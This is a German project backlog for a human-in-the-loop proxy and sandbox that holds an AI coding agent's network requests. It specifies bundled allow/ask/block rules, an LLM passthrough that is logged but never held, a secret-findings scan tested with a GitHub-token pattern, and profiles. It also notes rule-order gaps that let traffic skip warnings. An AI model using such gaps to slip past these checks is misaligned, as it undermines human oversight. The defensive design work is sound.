- [x] Das Rauschbudget des ersten Starts ist gemessen und grün im Job, der den M3-Lauf fährt. **Anders gebaut als die Spezifikation es nannte, und zwar dort, wo es etwas misst:** Ein Rust-Test hinter dem Feature `agent-e2e` hätte einen Sandbox-Start mit echtem OpenCode gebraucht, und den gibt es auf keinem Läufer; der Job heißt außerdem `e2e-agent` und fährt `tests/e2e/run.sh`. Das Budget steht deshalb als Schritt 5b im M3-Lauf: Der Skript-Agent ruft die vier Adressen ab, die ein frisch gestartetes OpenCode von sich aus abruft — Release-Check auf GitHub, Telemetrie, Modellkatalog der eigenen Adresse, Freigabe-Seite —, und der Lauf verlangt für jede `403` samt Entscheidung einer mitgelieferten Regel und danach eine leere Warteschlange. Gemessen am 2026-09-06: 105 Zusicherungen, `state:held` = 0, sechs von neun Flüssen von einer Regel entschieden. Der `ask` auf `registry.npmjs.org` ist mit Absicht nicht im Bündel: Er hielte zwanzig Sekunden auf eine Entscheidung, die das Skript danach treffen müsste; null ist die schärfere Zahl als das erlaubte `held <= 1`.

### Stand (2026-09-04, Nachtrag 2026-09-12): Regelsatz und Kommandozeile stehen, Reihenfolge entschieden (HUM-104), Oberfläche vollständig (HUM-105)

Umgesetzt und gemessen ist alles, was ohne die Dart-Seite prüfbar ist:

- `rules/default.yaml` steht und wird über `include_str!` in `humanitld`
  gebunden. Beleg ist die Ausgabe, nicht die Zahl im Protokoll:
  `humanitl rules list --all` zeigt die zehn Regeln, jede mit
  `ORIGIN bundled` und ihrer festen Id. Die Zeile `rule store loaded` taugt
  dafür nicht — `main.rs:648` zählt `bundled.len()`, und darin steckt die
  Durchreichregel aus `main.rs:633`: ohne `llm.endpoint` steht dort
  `bundled=10`, mit gesetztem Endpunkt `bundled=11` (beides gemessen).
- Regel-Engine: `Rule.disabled` in `humanitl-core`,
  `RuleSet::set_disabled_bundled` und der Dateischlüssel `disabled_bundled`
  in `humanitl-rules`; `RuleSet::evaluate` überspringt eine abgeschaltete
  Regel, als gäbe es sie nicht. Ein `disabled_bundled`, das eine Regel
  derselben Datei benennt, warnt seit HUM-038 mit `RULES_010` und schaltet sie
  trotzdem ab; wer „aus" schreibt, bekommt nie das Gegenteil.
- Kommandozeile: `humanitl rules list --all` zeigt die zehn Regeln mit
  `ORIGIN bundled`, eine abgeschaltete als `bundled (off)`;
  `humanitl rules disable|enable ID` schaltet sie über
  `RulesRequest.set_disabled` ab und wieder an; `--json` trägt `bundled`,
  `disabled` und `origin`. Ohne `--all` nennt eine Fußzeile, was fehlt:
  `10 bundled rules and 1 passthrough rule also apply; humanitl rules list
  --all shows them`. Vorher stand der Hinweis nur im Zweig der leeren Liste,
  und sobald der Nutzer eine eigene Regel hatte, schwieg die Kommandozeile
  über elf Regeln, die entscheiden — während `cli.rs:287` verspricht, sie
  zeige die Regeln „in the order in which they are evaluated"
  (CONVENTIONS 4.13).

**Was die Fußzeile zählt, und warum getrennt.** Eine abgeschaltete oder
abgelaufene Regel steht nicht unter „gilt auch", sondern wird eigens
genannt: `8 bundled rules and 1 passthrough rule also apply, 2 rules are
switched off`. Die Alternative — eine Summe mit Nebensatz („10 bundled
rules also apply, 2 of them switched off") — nennt zuerst eine Zahl, die
nicht stimmt, und nimmt sie danach halb zurück; wer nur den ersten Halbsatz
liest, hat die falsche Zahl im Kopf. Es wäre außerdem derselbe Fehler, den
diese Bestandsaufnahme dem Regel-Bildschirm vorwirft: eine abgeschaltete
Regel wie eine wirksame zu zeichnen (CONVENTIONS 4.13). Vier Töpfe,
geprüft in dieser Reihenfolge: abgelaufen, abgeschaltet, Durchreiche,
mitgeliefert. Abgelaufen steht vorn, weil eine abgelaufene Regel auch dann
nichts entscheidet, wenn jemand sie wieder anschaltet. Jede verborgene Regel
fällt in genau einen Topf; die Zusage „Zeilen der Tabelle plus Summe der
Fußzeile ist die Zeilenzahl von `--all`" steht als Test
(`every_hidden_rule_is_counted_exactly_once`) und ist an einem laufenden
Daemon nachgerechnet: 1 + (8 + 1 + 2) = 12.

**`RuleSet::prepend_bundled` gehört nicht in diese Liste.** Die Funktion
(`daemon/crates/rules/src/eval.rs:394`) hatte außerhalb von Tests keinen
Aufrufer; alle vier Fundstellen waren Tests, darunter der grüne
`prepend_bundled_puts_the_bundled_rules_first`. Der Daemon baute seinen
Regelsatz über `RulesStore::load`, nicht über sie. Ihre Tests sagten deshalb
nichts über das laufende Produkt aus, und dieses Häkchen hätte auf sie nie
gestützt werden dürfen. HUM-104 hat das aufgelöst: Die Funktion heißt jetzt
`RuleSet::add_bundled`, hängt hinten an und wird von `RulesStore::snapshot_of`
gerufen.
- Tests grün: `default_rules_parse`, `default_rules_match_table`,
  `disabled_bundled_is_skipped`, `a_user_rule_overrides_a_bundled_rule`
  (`daemon/crates/sandbox/tests/default_rules.rs`), dazu in
  `daemon/crates/rules` die Datei-Tests von `disabled_bundled`
  (`tests/parse.rs`) und die Engine-Tests dazu (`tests/eval.rs`): eine
  abgeschaltete Regel entscheidet nichts, die nächste kommt dran, und ohne
  weitere Regel bleibt es bei `ask`.

**Offen und ausdrücklich nicht gedeckt:**

- **Der Schalter „Deaktivieren" im Rules-Screen — seit HUM-105 nachgeliefert,
  dieser Punkt ist zu.** Als dieser Abschnitt entstand, kannte
  `app/lib/core/domain/rule.dart` kein `disabled`, `app/lib/core/ipc/convert.dart`
  las es nicht aus der Proto, und `DaemonClient` hatte keine Operation dafür;
  solange das fehlte, zeichnete der Bildschirm eine abgeschaltete mitgelieferte
  Regel wie eine wirksame (CONVENTIONS 4.13). HUM-105 (`backlog/sprint-2.md`,
  gemergt als `8953dc8`) hat alles Genannte gebaut. Nachgesehen am 2026-09-12:
  das Feld in `rule.dart:83`, die Zeile in `convert.dart:459`, `setRuleDisabled`
  in `DaemonClient`, `GrpcDaemonClient` und `FakeDaemonClient`, `_DisableSwitch`
  in `rule_row.dart:269` samt ARB-Schlüsseln.
- **`startup_noise_budget`.** Der Metriktest braucht einen Endpunkt, der
  `/v1/models` beantwortet; den liefert HUM-046. Bis dahin gibt es weder
  `daemon/crates/sandbox/tests/startup_noise.rs` noch das Feature `agent-e2e`
  noch einen CI-Job dieses Namens. Nachgesehen am 2026-09-12: Das gilt wörtlich
  weiter — keine Datei `startup_noise*` im Baum, kein Abschnitt `[features]` in
  `daemon/crates/sandbox/Cargo.toml`, kein Job dieses Namens in
  `.github/workflows/ci.yml`. Der Test entsteht auch nicht mehr: Das Rauschbudget
  steht seit dem 2026-09-06 als Schritt 5b des M3-Laufs im Job `e2e-agent`
  (drittes Akzeptanzkriterium oben), und deshalb bleiben die drei genannten
  Stellen absichtlich leer.

**Die Reihenfolge war keine falsche Anforderung, sondern eine offene
Entscheidung. Sie ist in HUM-104 getroffen — vier Ränge in
`backlog/CONVENTIONS.md` 4.5 —, und das Kästchen ist seit dem 2026-09-06
getickt (Commit 931021d, gemessen an einem laufenden Daemon).** Was folgt, ist
die Vorgeschichte dieser Entscheidung: Das Repository widersprach sich über
genau diese Frage:

- **Für „mitgeliefert zuletzt":** HUM-027 (`backlog/sprint-2.md`) legt
  Sitzung, Nutzer, mitgeliefert fest, damit eine eigene Regel eine
  mitgelieferte überstimmen kann, ohne sie abschalten zu müssen.
  `rules_store.rs:20-24` schreibt es so hin, und `State::all`
  (`rules_store.rs:163-170`) setzt es um.
- **Für „Durchreiche und mitgeliefert zuerst":** `docs/profiles.md:171-175`
  aus HUM-066 sagt das Gegenteil — „die Durchreichregel des Agent-Adapters,
  dann seine mitgelieferten Regeln, dann die Dateien und Regeln der Profile,
  zuletzt die `rules.yaml` des Nutzers". Der Kommentar in `main.rs:629-634`
  meint dasselbe („Die Durchreiche steht vor allem anderen") und erreicht
  es nicht: er legt die Durchreiche in dieselbe Liste wie die mitgelieferten
  Regeln, und die hängt `State::all` hinten an.
- Beide Seiten berufen sich auf `backlog/CONVENTIONS.md` 4.5. Dort steht nur
  Sitzung vor dauerhaft; über die mitgelieferten Regeln schweigt der
  Abschnitt. Die Nummer trägt die Entscheidung also nicht, die sie belegen
  soll.

**Was daran heute schon kaputt ist**, und was HUM-104 zu reparieren hat:

- `profiles/llm-only.toml:35` bringt `block host "**"` mit, und sein
  Kommentar (Zeilen 8 bis 10) erklärt, die Durchreiche träfe davor. Sie trifft
  danach. Sobald `[rules].inline` des Profils verdrahtet ist, erreicht
  `humanitl run --profile llm-only` sein eigenes Sprachmodell nicht mehr.
- `pipeline.rs:350` erkennt die Durchreiche an der Regel, die entschieden hat.
  Trifft vorher eine `allow`-Regel des Nutzers, gibt es kein
  `DecisionSource::Passthrough` und kein `LLM_005`: der erklärte Seitenkanal
  (BACKLOG.md 4.2) wird still zu einem gewöhnlichen Allow.

**Ein Teil des Kriteriums bleibt trotzdem abgelehnt:**
„die 8 Regeln" und `humanitl rules list` ohne `--all`. Es sind zehn, und
die beiden zusätzlichen sind am installierten Binary 1.18.25 gemessen
(CONVENTIONS 4.17). `--all` ist der Schalter, unter dem HUM-065 mitgelieferte
und abgelaufene Regeln zeigt; ohne ihn zeigt die Liste, was dem Nutzer
gehört. Der Zweck des Kriteriums — niemand soll übersehen, dass mitgelieferte
Regeln mitentscheiden — ist seit der Fußzeile oben erfüllt.

### Fallstricke
- Hostnamen ändern sich. Jede Regel hat eine `note`, die erklärt, warum sie existiert, damit ein späterer Leser sie prüfen kann.
- `**.posthog.com` matcht auch `posthog.com` selbst (CONVENTIONS.md 3.3). Gewollt.
- Die npm-Regel darf nicht `allow` sein: Pakete können Postinstall-Skripte tragen. `ask` ist bewusst.
- Regel-IDs sind feste UUIDv7-Literale, damit `disabled_bundled` stabil referenzieren kann.

### Referenzen
BACKLOG.md 10 (Risiko 3), Abschnitt 5 (Usability: „Der erste Flow, den der Nutzer sieht, muss einer sein, den er ausgelöst hat"); CONVENTIONS.md 3.3. OpenCode CLI-Doku zu Env-Variablen (https://opencode.ai/docs/cli/).

---

## HUM-039 · LLM-Passthrough-Regel und Endpoint-Test
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-015, HUM-022, HUM-025, HUM-026, HUM-037 · Blockiert: HUM-041, HUM-044, HUM-067

### Kontext
Der Agent muss legitim Code ans LLM schicken, ohne dass jede Inferenz gehalten wird. ADR-006 und BACKLOG.md 4.2 verlangen: kein direktes Loch, sondern eine Passthrough-Regel im Proxy, eng gefasst (Host, Port, Pfadpräfix, POST), vollständig geloggt, Findings-Scan mit Warnung ohne Halt. Der Passthrough ist die deklarierte Vertrauensgrenze und wird im Isolation-Panel (HUM-041) amber angezeigt.

### Ziel
Aus `llm.endpoint` erzeugt der Adapter eine Regel mit `action: allow`, Flag `passthrough_llm: true`. Der Proxy behandelt Flows mit dieser Regel als `passthroughLlm`: kein Hold, Request-Body wird gepuffert (für Findings und Recorder), Response gestreamt und gespiegelt, Findings erzeugen ein `Diagnostic` `LLM_005` (Warning) pro Flow, das im Feed als amber Zeile erscheint. Der Setup-Screen hat ein Endpoint-Feld mit „Test", das host-seitig `GET /api/tags` (Ollama) oder `GET /v1/models` (OpenAI-kompatibel) aufruft und die Modellliste anbietet.

### Nicht-Ziel
Kein Halten von Passthrough-Flows (Post-MVP: findings-basiertes Halten). Keine TLS-Passthrough-Regel ohne MITM: ist `llm.endpoint` `https`, wird ganz normal terminiert. Kein Rate-Limit.

### Betroffene Pfade
- `daemon/crates/rules/src/lib.rs`: `Rule.passthrough_llm: bool`, `Matcher.path_prefixes: Vec<String>`
- `daemon/crates/sandbox/src/agent/opencode.rs`: `llm_passthrough()`
- `daemon/crates/proxy/src/flow.rs`: Passthrough-Pfad
- `daemon/crates/proxy/src/llm_probe.rs` (neu): Endpoint-Test
- `daemon/crates/ipc/src/service.rs`: RPC `ProbeLlm`
- `proto/humanitl/v1/humanitl.proto`: `ProbeLlmRequest { string endpoint }`, `ProbeLlmResponse { repeated string models; string flavor; Diagnostic diagnostic }`
- `app/lib/features/setup/widgets/llm_endpoint_field.dart` (neu)
- `app/lib/features/setup/providers/llm_probe_provider.dart` (neu)

### Spezifikation

Regel-Erzeugung:

```rust
fn llm_passthrough(&self, llm: &LlmConfig) -> Rule {
    let url = &llm.endpoint;                       // validated Url in config
    let host = HostName::parse(url.host_str().unwrap_or_default());   // Ip or Dns, normalized
    Rule {
        id: RuleId::from_u128(0x0192_0000_0000_7000_8000_0000_0000_00ff),
        action: Action::Allow,
        matcher: Matcher {
            host: HostPattern::Exact(host),
            method: Some(vec![Method::POST, Method::GET]),
            path_prefixes: llm.passthrough_paths.clone(),   // default ["/v1/", "/api/"]
            scheme: Some(url.scheme().parse()?),
            port: Some(url.port_or_known_default().unwrap_or(80)),
            upgrade: None,
        },
        expires: Expiry::Never,
        stream: false,
        created_from: None,
        bundled: true,
        passthrough_llm: true,
        note: Some(format!("LLM passthrough for {url}. Logged, never held.")),
    }
}
```

`GET` ist enthalten, weil OpenCode `GET /v1/models` zur Modellliste aufruft. `path_prefixes` ist ein neues Matcher-Feld: Treffer, wenn der Request-Pfad mit einem der Präfixe beginnt. Für IP-Literale wird `HostPattern::Exact(HostName::Ip(..))` verwendet; das ist die einzige Stelle, an der eine IP-Regel automatisch entsteht (CONVENTIONS.md 3.3: IPs matchen sonst nie).

Proxy-Pfad in `flow.rs`, nach `Analyzed`:

```rust
match ruleset.evaluate(&key, now, session) {
    Verdict::Matched { rule, action: Action::Allow } if ruleset.is_passthrough_llm(rule) => {
        state = state.on(&FlowEvent::Decided { id, decision: Decision::Allow, rule: Some(rule), passthrough: true })?;
        if !findings.is_empty() {
            diagnostics.emit(Diagnostic {
                code: DiagnosticCode("LLM_005"), severity: Severity::Warning,
                title: t!("llm.findings_in_prompt.title"),
                why: t!("llm.findings_in_prompt.why", count = findings.len(), host = key.host),
                fix: None, docs: Some(DOCS_LLM_TRUST_BOUNDARY),
            }.for_flow(id));
        }
        forward_streaming(flow).await   // request body already buffered; response streamed + mirrored
    }
    ...
}
```

`FlowEvent::Decided` bekommt das Feld `passthrough: bool`; die UI leitet daraus den Zustand `passthroughLlm` ab (Farbe #B48AF0, Icon `chevrons-right`). Der Recorder speichert Passthrough-Flows wie alle anderen, `flows.decision = "allow"`, `flows.rule_id = <passthrough id>`.

Endpoint-Probe (`llm_probe.rs`), host-seitig, nie aus der Sandbox:

```rust
pub enum LlmFlavor { Ollama, OpenAiCompatible, Unknown }
pub struct ProbeResult { pub flavor: LlmFlavor, pub models: Vec<String>, pub latency_ms: u32 }
pub async fn probe(endpoint: &Url, timeout: Duration) -> Result<ProbeResult, Diagnostic>;
```

Ablauf: (1) `GET {endpoint}/api/tags`, bei 200 und JSON mit `models[].name` ⇒ `Ollama`. (2) Sonst `GET {endpoint}/v1/models`, bei 200 und `data[].id` ⇒ `OpenAiCompatible`. (3) Beides 404 ⇒ `Unknown` mit leerer Liste und `LLM_003`. Timeout 3 s. Keine Redirect-Verfolgung. Keine Cookies. Nur `http` und `https`; bei `https` wird der System-Trust-Store des Hosts genutzt, nicht die Humanitl-CA.

Diagnostics:

| Code | Severity | Auslöser | why (en) | fix |
|---|---|---|---|---|
| `LLM_001` | Blocking | TCP-Connect fehlgeschlagen oder Timeout | "Humanitl could not reach {host}:{port} from this machine. The agent will not be able to talk to the model." | `ChangeSetting { key: "llm.endpoint" }`, plus `CopyCommand("curl -sS {endpoint}/api/tags")` |
| `LLM_002` | Error | Verbindung ok, HTTP-Status 401/403 | "The LLM server answered {status}. It requires authentication that Humanitl does not send in the MVP." | `OpenUrl(docs)` |
| `LLM_003` | Warning | Verbindung ok, weder Ollama- noch OpenAI-Pfad gefunden | "Connected, but neither /api/tags nor /v1/models answered. Check that the URL points at the API root, not a chat UI." | `ChangeSetting { key: "llm.endpoint" }` |
| `LLM_004` | Warning | keine Modelle konfiguriert | siehe HUM-037 | `ChangeSetting { key: "llm.models" }` |
| `LLM_005` | Warning | Findings im Passthrough-Request | "This request to your LLM contains {count} potential secret(s) or personal data. It was sent because the LLM endpoint is a declared trust boundary." | keine, `docs` |
| `LLM_006` | Info | Endpoint ist keine private Adresse (nicht RFC1918, nicht Loopback, nicht `.local`/`.lan`/`.home.arpa`) | "This endpoint is not on a private network. Only put a machine you control here." | `ChangeSetting { key: "llm.endpoint" }` |

Setup-Widget `LlmEndpointField`: Textfeld (Placeholder `http://192.168.1.50:11434`), Button „Test" (HButton secondary), unter dem Feld genau ein Satz (ARB `setup_llm_passthrough_note`: en "Traffic to this address bypasses the queue. Only put a machine you control here." / de "Verkehr zu dieser Adresse umgeht die Warteschlange. Trage hier nur eine Maschine ein, die du kontrollierst."). Nach erfolgreichem Test: Chip mit Flavor und Latenz, Multi-Select der Modelle, „Übernehmen" schreibt `llm.models`. Bei Diagnostic: Inline-Karte unter dem Feld mit `title`, `why`, Fix-Button.

### Schritte
1. `Matcher.path_prefixes`, `Rule.passthrough_llm`, `RuleSet::is_passthrough_llm` in `humanitl-rules` mit Tests.
2. `llm_passthrough()` im Adapter.
3. Proxy-Pfad: Passthrough-Zweig, `Decided.passthrough`, `LLM_005`-Emission. Integrationstest gegen axum-Fake mit SSE-Antwort.
4. `llm_probe.rs` + `ProbeLlm`-RPC + Diagnostics `LLM_001..003, 006`.
5. Config: `llm.endpoint` (Tier basic), `llm.passthrough_paths` (advanced), `llm.models` (basic), `llm.probe_timeout_ms` (expert, Default 3000).
6. Flutter: `LlmEndpointField`, Provider, ARB-Strings, Widget-Test.

### Tests
- `passthrough_rule_matches_only_endpoint`: Endpoint `http://192.168.1.50:11434`; `POST 192.168.1.50:11434 /v1/chat/completions` ⇒ allow passthrough; `POST 192.168.1.50:11434 /admin` ⇒ Default; `POST 192.168.1.50:8080 /v1/x` ⇒ Default; `POST 192.168.1.51:11434 /v1/x` ⇒ Default; `DELETE 192.168.1.50:11434 /v1/x` ⇒ Default.
- `passthrough_streams_sse`: Fake-Upstream sendet 50 SSE-Chunks mit 20 ms Abstand; Client erhält den ersten Chunk unter 100 ms nach Request-Ende (nicht gepuffert); Recorder enthält den vollständigen Body.
- `passthrough_findings_emit_llm_005`: Body enthält `ghp_` + 36 Zeichen ⇒ genau ein `LLM_005`, Flow ist trotzdem `Forwarded`.
- `probe_detects_ollama`, `probe_detects_openai`, `probe_unknown_paths_llm_003`, `probe_timeout_llm_001`, `probe_public_ip_llm_006`.
- Widget-Test `LlmEndpointField`: Test-Klick ruft Provider, Erfolg zeigt Modell-Chips, Diagnostic zeigt Karte mit Fix-Button.

### Akzeptanzkriterien
- [x] `humanitl rules test http://192.168.1.50:11434/v1/chat/completions --method POST` ⇒ `allow · passthrough_llm · bundled`. **Gemessen am 2026-09-07**, in der Form, die das Kommando seit HUM-114 hat: `verdict: allow` und darunter `rule: 01920000-0000-7000-8000-0000000000ff (bundled, position 1, passthrough_llm)`, Exit 0 — gegen einen laufenden `humanitld` mit `llm.endpoint = http://192.168.1.50:11434`. Alle drei Angaben des Kriteriums stehen darin: erlaubt, aus der Durchreiche, mitgeliefert. Die Herkunft bleibt `bundled`, weil die Durchreiche in dieser Gruppe steht und ihren Rang als Vermerk trägt (CONVENTIONS 4.5 verlangt `passthrough_llm` **und** `bundled`); eine vierte Herkunft wäre eine Gruppe, die es nicht gibt. Dauerhaft gemessen wird es im M3-Demoskript (`tests/e2e/m3_agent_inside/run.sh`, Schritt 1, fünf Zusicherungen): der Inferenzpfad endet 0 mit genau dieser Zeile — Id und Position sind im Muster festgenagelt —, und derselbe Server unter `POST /api/pull` endet 11 mit `rule: none (default ask)`. Der Gegenfall liegt mit Absicht **unter** der Fläche `/api/`: Ein Pfad außerhalb beider Flächen (`/admin`) bliebe auch dann gehalten, wenn die Durchreiche wieder `/api/` als Ganzes erlaubte, und bewiese nichts über CONVENTIONS 4.21. Mutationsprobe am 2026-09-07 mit `llm.passthrough_paths = ["/ap", "/v"]`, also Flächen, die die Ersetzung des Adapters nicht erkennt: `/api/pull` und `/v1/files` enden dann `allow`/0, `/admin` bleibt bei `ask`/11 — die neue Zusicherung fällt, die alte hätte gehalten. Lauf am 2026-09-07: 111 Zusicherungen, `M3 demo: OK with gaps` — das „with gaps" ist die OpenCode-Variante, die auf dieser Maschine übersprungen wird (kein `opencode` unter `/usr/local/bin`, `/usr/bin` oder `/bin`), und gehört zu HUM-046, nicht zu diesem Kriterium.
- [x] History-Screen zeigt Passthrough-Flows in Violett mit Regel-Chip, standardmäßig eingeklappt (Filter-Chip „LLM anzeigen").
- [x] Setup: Test gegen laufendes Ollama liefert Modellliste in unter 3 s. **Gemessen am 2026-09-06 gegen das Ollama dieser Maschine**, beide Hälften des Wegs: Der Dienst antwortet mit `ollama at http://127.0.0.1:11434/, 1 models, 9 ms` (`humanitl doctor --probe-llm` gegen einen laufenden `humanitld` mit `llm.endpoint = http://127.0.0.1:11434`; 9 ms, also drei Größenordnungen unter der Zusage), und die Zeile zeigt, was er nennt: `llm_row_uses_probe` (`app/test/features/setup/llm_row_test.dart`) belegt die Modellliste in der Zeile, `model_chip_is_clamped` den Deckel darauf. Die Frist selbst steht im Dienst: Ohne Antwort endet die Probe nach 3000 ms, siehe das Kästchen darunter.
- [x] Setup: Test gegen `http://10.255.255.1:1` liefert `LLM_001` mit kopierbarem curl-Befehl. **Gemessen am 2026-09-06 gegen genau diese Adresse:** Die Probe endet nach 3,96 s Wanduhrzeit (3000 ms Frist plus Auflösung und Aufbau) mit `LLM_001: Humanitl could not reach 10.255.255.1:1 from this machine (no answer within 3000 ms)` und dem Befehl `curl -sS http://10.255.255.1:1/api/tags` als `copy_command`. Die Oberflächen-Hälfte hält `an address that nobody answers shows LLM_001 and its curl` (`app/test/features/setup/llm_row_test.dart`): Code und Befehl stehen in der Zeile, und neben einer Adresse, die nichts gesagt hat, steht keine Modellliste. Mutationsprobe: Der Befehl wird nicht mehr angezeigt, Test rot. **Ein Unterschied zur Formulierung des Kriteriums bleibt und ist gewollt:** Im Doctor trägt die Zeile `DOCTOR_008` als Code der Prüfung, und `LLM_001` steht im `why` — die Probe des Setup-Bildschirms dagegen zeigt `LLM_001` selbst, weil sie den Befund des Dienstes ungefiltert nimmt.
- [x] `LLM_005` erscheint im Feed als amber Zeile, öffnet die Flow-Details. **Beide Hälften gemessen, die zweite am 2026-09-11.** Die Karte eines Befundes, der an einem Flow hängt, trägt in ihrem Aktionsbereich „Anfrage öffnen"; der Knopf hinterlässt eine Notiz (`flowRevealProvider`), die Shell wechselt zur Historie, und die Historie holt den Flow mit `GetFlow` aus der Aufzeichnung und öffnet ihr Blatt, auch wenn er in keiner geladenen Zeile steht. Gemessen in `diagnostic_card_test.dart` (`a_finding_on_a_flow_offers_to_open_it`: Knopf, Bereichswechsel, Auswahl, Blatt; `a_finding_without_a_flow_has_no_way_to_one`) und `history_handoff_test.dart` (ein Flow außerhalb der ersten 200 Zeilen öffnet sich; eine Anfrage, die der Daemon nicht kennt, steht als Karte mit dem Satz des Daemons statt still zu scheitern, und die nächste gelingende ersetzt sie). Zwei Review-Runden von Codex und Antigravity. **Die Vorgeschichte, wie sie am 2026-09-06 stand:** Die erste Hälfte ist gemessen, die zweite offen und begründet. Gemessen am 2026-09-06 in `app/test/features/intercept/diagnostic_card_test.dart` (`llm_005_is_an_amber_line_in_the_strip`): Der Befund steht im Streifen mit Code und dem Satz des Daemons, und seine Farbe ist `state.held` — Bernstein, nie das Rot des Blockierens. Der Klick auf die Flow-Details fehlt, und zwar nicht aus Nachlässigkeit: Der Fluss hinter `LLM_005` ist eine **Durchreiche**, und die steht in keiner Warteschlange (`flows list` zeigt sie nicht, CONVENTIONS 4.29). Ein Klick müsste sie über `GetFlow` aus der Aufzeichnung holen und in der Historie öffnen; die Feed-Karte samt diesem Weg gehört HUM-106 (Sprint-2-Tabelle in `BACKLOG.md`), das auch `flowId` auf der Karte trägt.

### Fallstricke
- Der Passthrough darf nie `stream: true` für den Request-Body bekommen. ADR-005 gilt auch hier: Request wird gepuffert, nur die Response streamt.
- `path_prefixes` mit leerem Präfix `""` würde alles matchen. Validierung: jeder Präfix beginnt mit `/` und ist mindestens 2 Zeichen.
- `llm.endpoint` mit Pfadanteil (`http://host:1/v1`) muss den Pfadanteil im Matcher ignorieren, aber in `opencode.json` korrekt weiterreichen (HUM-037 Test `appends_v1_only_once`).
- Die Probe läuft auf dem Host mit Host-DNS. Ein Hostname wie `ollama.lan` funktioniert in der Probe, aber der Proxy löst denselben Namen erst nach Regel-Treffer auf (ADR-006). Beides muss dasselbe Resolver-Verhalten haben; Test mit `/etc/hosts`-Eintrag im CI.
- Ollama antwortet auf `/v1/models` ebenfalls; Reihenfolge der Probe ist deshalb Ollama zuerst, damit der Flavor stimmt.

### Referenzen
BACKLOG.md 4.2, 4.3, ADR-005, ADR-006, Abschnitt 5 (Usability §1 LLM-Feld); CONVENTIONS.md 3.3, 3.5. Ollama API (`/api/tags`), OpenAI-kompatible Modelle-Liste (`/v1/models`).

---

## HUM-066 · Profile

> **Abgleich 2026-09-02**: Das Profil-Format ist durch HUM-062 festgelegt: `name`, `description`, `[config.<gruppe>]` für Konfigurationswerte, daneben `[rules]` und `[agent]`. Flache Blöcke wie `[hold]` auf der obersten Ebene, wie sie unten skizziert sind, lehnt der Loader mit `CONFIG_002` ab; die Beispiele in diesem Issue sind entsprechend zu lesen (`[config.hold]`).

Sprint: 3 · Größe: M · Abhängigkeiten: HUM-062, HUM-010, HUM-037, HUM-039 · Blockiert: HUM-040, HUM-067

### Kontext
ADR-011: Wenig tun müssen, viel tun können. Ein Profil bündelt alles, was eine Session ausmacht, und ist eine Datei, die global oder pro Projekt liegt. `humanitl run --profile llm-only` und das UI nutzen dieselben Profile. Profile sind auch der spätere Erweiterungspunkt für Team-Profile (BACKLOG.md Abschnitt 6).

### Ziel
`humanitl-config` kennt den Typ `Profile`, lädt Profile aus drei Orten mit fester Präzedenz, liefert die aufgelöste `EffectiveConfig` mit `Origin` pro Feld, und die zwei mitgelieferten Profile `default` und `llm-only` existieren als Dateien und als eingebettete Fallbacks. Das Setup (HUM-044) und die CLI (HUM-067) wählen Profile über denselben Loader.

### Nicht-Ziel
Kein Profil-Editor im UI (HUM-069 Settings-Screen zeigt die aufgelöste Config, Profil-Bearbeitung ist Datei-basiert im MVP). Kein Import aus URLs.

### Betroffene Pfade
- `daemon/crates/config/src/profile.rs` (neu)
- `daemon/crates/config/src/resolve.rs`: Präzedenz erweitern
- `profiles/default.toml` (neu), `profiles/llm-only.toml` (neu)
- `daemon/crates/config/tests/profiles.rs` (neu)
- `daemon/bin/humanitl/src/cmd/run.rs`: `--profile`
- `docs/profiles.md` (neu)

### Spezifikation

Profil-Format (alle Felder optional, fehlende Felder erben aus der nächstniedrigeren Ebene):

```toml
# profiles/default.toml
name = "default"
description = "Ask for everything not covered by a rule. Full moderation with UI."

[llm]
# endpoint is intentionally absent: it comes from config.toml (basic setup)
passthrough_paths = ["/v1/", "/api/"]

[hold]
timeout_secs = 300
body_cap_bytes = 33554432
ask_mode = "ui"            # ui | terminal | none

[sandbox]
profile = "default"        # references profiles/sandbox/default.toml
work_mode = "rw"
[sandbox.mounts]
cache = true               # persistent per-project cache volume for the agent
extra_ro = []              # additional host paths mounted read-only, absolute
extra_rw = []
[sandbox.env]
# additional environment variables for the agent, merged after the adapter's env

[agent]
adapter = "opencode"
# command = ["opencode"]  # override

[rules]
files = ["rules.yaml"]     # relative to the profile's directory or absolute; merged in order after bundled rules
inline = []                # rules written directly in the profile, same schema as rules.yaml

[recorder]
inline_max_bytes = 262144
retention_days = 90
```

```toml
# profiles/llm-only.toml
name = "llm-only"
description = "Pure inference. Only the configured LLM endpoint is reachable; everything else is blocked without asking. No UI needed."

[hold]
ask_mode = "none"
timeout_secs = 1

[sandbox]
profile = "default"
work_mode = "rw"

[agent]
adapter = "opencode"

[rules]
inline = [
  { action = "block", match = { host = "**" }, expires = "never", note = "llm-only profile: block everything that is not the LLM passthrough" },
]
```

Die Passthrough-Regel wird vom Adapter vorangestellt und trifft vor der `**`-Blockregel. `ask_mode = "none"` bedeutet: `Verdict::Default` wird sofort zu `Decision::Block { reason: BlockReason::Rule(NONE_MODE_RULE_ID) }`, ohne Hold; `timeout_secs` ist dann irrelevant, wird aber auf 1 gesetzt, damit ein Fehlkonfiguration nicht hängt.

Präzedenz (niedrig nach hoch), erweitert aus CONVENTIONS.md 3.7:

1. Eingebaute Defaults (`Config::default()`)
2. `$XDG_CONFIG_HOME/humanitl/config.toml`
3. Profil `default` (eingebettet via `include_str!`, überschrieben durch `$XDG_CONFIG_HOME/humanitl/profiles/default.toml`, falls vorhanden)
4. Gewähltes Profil, falls nicht `default`: `$XDG_CONFIG_HOME/humanitl/profiles/<name>.toml`, sonst eingebettetes `<name>` (nur `llm-only` ist eingebettet)
5. Projekt-Profil `<work_dir>/.humanitl/profile.toml` (falls vorhanden; darf `name` setzen, dann wird zuerst dieses benannte Profil aus Ebene 4 geladen und danach die Projekt-Datei darüber gelegt)
6. Umgebungsvariablen `HUMANITL_*`
7. CLI-Flags

```rust
pub struct Profile { pub name: String, pub description: Option<String>, pub overlay: ConfigOverlay }  // ConfigOverlay = Config mit allen Feldern Option<T>
pub enum Origin { Default, GlobalConfig, ProfileBuiltin(String), ProfileGlobal(PathBuf), ProfileProject(PathBuf), Env(String), Cli(String) }
pub struct EffectiveConfig { pub config: Config, pub origins: BTreeMap<String /* dotted key */, Origin>, pub profile_chain: Vec<Origin> }
pub fn resolve(sel: &ProfileSelection, work_dir: Option<&Path>, env: &[(String,String)], cli: &CliOverrides) -> Result<EffectiveConfig, Diagnostic>;
pub struct ProfileSelection { pub name: Option<String> }   // None = "default" or project's name
```

